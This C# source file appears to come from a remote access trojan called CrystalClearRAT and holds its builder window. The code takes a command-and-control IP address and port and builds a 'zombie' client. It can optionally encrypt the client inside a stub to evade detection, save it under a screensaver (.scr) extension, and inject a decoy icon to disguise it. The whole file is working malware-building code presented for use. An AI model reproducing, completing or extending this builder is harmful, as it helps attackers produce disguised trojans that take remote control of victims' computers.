using CrystalClearRAT.Helper;
using CrystalClearRAT.Stub;
using CrystalRATShared.Helper;
using MahApps.Metro.Controls;
using Microsoft.Win32;
using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.IO;
using System.Linq;
using System.Runtime.CompilerServices;
using System.Text;
using System.Threading.Tasks;
using System.Windows;
using System.Windows.Controls;
using System.Windows.Data;
using System.Windows.Documents;
using System.Windows.Input;
using System.Windows.Media;
using System.Windows.Media.Imaging;
using System.Windows.Shapes;

namespace CrystalClearRAT.Windows
{
    /// <summary>
    /// Logika interakcji dla klasy BuilderWindow.xaml
    /// </summary>
    public partial class BuilderWindow : MetroWindow, INotifyPropertyChanged
    {

        public string IconFilePath { get; private set; } = "No icon.";
        public BuilderWindow()
        {
            DataContext = this;
            InitializeComponent();
            stubEncryptionPasswordTextBox.Text = Guid.NewGuid().ToString();

        }

        public event PropertyChangedEventHandler PropertyChanged;

        private void BuildButton_Click(object sender, RoutedEventArgs e)
        {
            string errorMsg = "";

            if (string.IsNullOrWhiteSpace(ipTextBox.Text))
            {
                errorMsg = "IP cannot be empty.";
            }
            else if (string.IsNullOrWhiteSpace(portTextBox.Text))
            {
                errorMsg = "Port cannot be empty.";
            }
            else if (generateStubCheckbox.IsChecked == true && string.IsNullOrWhiteSpace(stubEncryptionPasswordTextBox.Text))
            {
                errorMsg = "Encryption password cannot be empty.";
            }

            if (errorMsg.Length > 0)
            {
                MessageBox.Show(errorMsg, "Error", MessageBoxButton.OK, MessageBoxImage.Error);
                return;
            }



            SaveFileDialog dialog = new SaveFileDialog()
            {
                Filter = "Executable (.exe)|*.exe|Screensaver (.scr)|*.scr"
            };
            // dialog.Filter = "Exe Files (.exe)|*.exe;
            if (dialog.ShowDialog() == true)
            {



                if (generateStubCheckbox.IsChecked == true)
                {
                    if (!File.Exists(IconFilePath))
                    {
                        IconFilePath = null;
                    }
                    ZombieBuilder.Build(new ClientSettings(ipTextBox.Text, int.Parse(portTextBox.Text)), "temp.exe");
                    StubCompiler.Compile("temp.exe", stubEncryptionPasswordTextBox.Text, dialog.FileName, IconFilePath);
                    File.Delete("temp.exe");
                }
                else
                {

                    ZombieBuilder.Build(new ClientSettings(ipTextBox.Text, int.Parse(portTextBox.Text)), dialog.FileName);
                    if (File.Exists(IconFilePath))
                    {

                        IconInjector.ChangeIcon(dialog.FileName, IconFilePath);
                    }
                }
            }
        }

        private void SelectIconButton_Click(object sender, RoutedEventArgs e)
        {
            OpenFileDialog dialog = new OpenFileDialog()
            {
                Filter = "Icons (.ico)|*.ico"
            };

            if (dialog.ShowDialog() == true)
            {
                IconFilePath = dialog.FileName;
            }


            //Console.WriteLine(IconFilePath);
        }
    }
}
